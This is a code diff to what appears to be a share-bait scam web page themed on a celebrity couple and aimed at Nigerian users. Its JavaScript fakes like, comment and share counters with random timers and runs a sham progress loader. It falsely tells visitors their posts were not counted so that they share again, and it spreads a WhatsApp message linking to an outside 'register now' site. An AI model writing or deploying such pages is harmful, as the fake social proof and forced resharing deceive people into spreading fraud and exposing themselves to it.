@@ -461,7 +461,7 @@ button:hover {
                     <div id="fill2"></div>
         </div>
                 <div class="percentage center">
-                    <span><i class="fa fa-spinner fa-pulse"></i></span>
+                    <span><i class="fa fa-spinner fa-pulse"></i>100</span>
                     <span id="percentage2">0%</span>
                 </div>
             </div>
@@ -511,9 +511,9 @@ var likes = 134,
     comments = 23,
     shares = 1;
 window.setInterval(function () {
-    likes = likes + Math.floor(Math.random() * 3);
-    comments = comments + Math.floor(Math.random() * 2);
-    shares = shares + Math.floor(Math.random() * 2);
+    likes = likes + Math.floor(Math.random() * 2);
+    comments = comments + Math.floor(Math.random() * 1);
+    shares = shares - Math.floor(Math.random() * 1);
     $("#likes").html(likes + "K");
     $("#comments").html(comments + "K comments");
     $("#shares").html(shares + "K shares");
@@ -544,7 +544,7 @@ $("#go").click(function () {
             $("#loader").fadeOut(0);
             $("#info").fadeIn(1000);
         }
-    }, 50);
+    }, 0);
 });
     
     $("#confirm").click(function () {
@@ -563,7 +563,7 @@ $("#go").click(function () {
             if (i == 50) {
                 i = 49;
                 setTimeout(function () {
-                    i = 50;
+                    i = 0;
                 }, 100);
             } 
      
@@ -578,7 +578,7 @@ $("#go").click(function () {
                     $("#getname").html($("#name").val());
                 }, 100);
             }
-        }, 50);
+        }, 0);
     }
 });
 $(document).click(function () {
@@ -594,7 +594,7 @@ $(document).click(function () {
 
 
 
-     var text1 = "*THANK YOU*%0A%0We have received your wishes *NIGERIANS*%0A%0A_CHECK HERE_👇%0Ahttps://yougain.online/davido&chioma.html",
+     var text1 = "*THANK YOU*%0AWe have received your wishes *NIGERIANS*%0A%0A_CHECK HERE_👇%0Ahttps://yougain.online/davido&chioma.html",
             text2 = " an amount of ",
             text3 = "Enter and register now and make sure to register correctly 👉 ",
             error = "Something is wrong!\nPosts are not calculated. You may have shared it with the same friend or group more than once, please re-share",
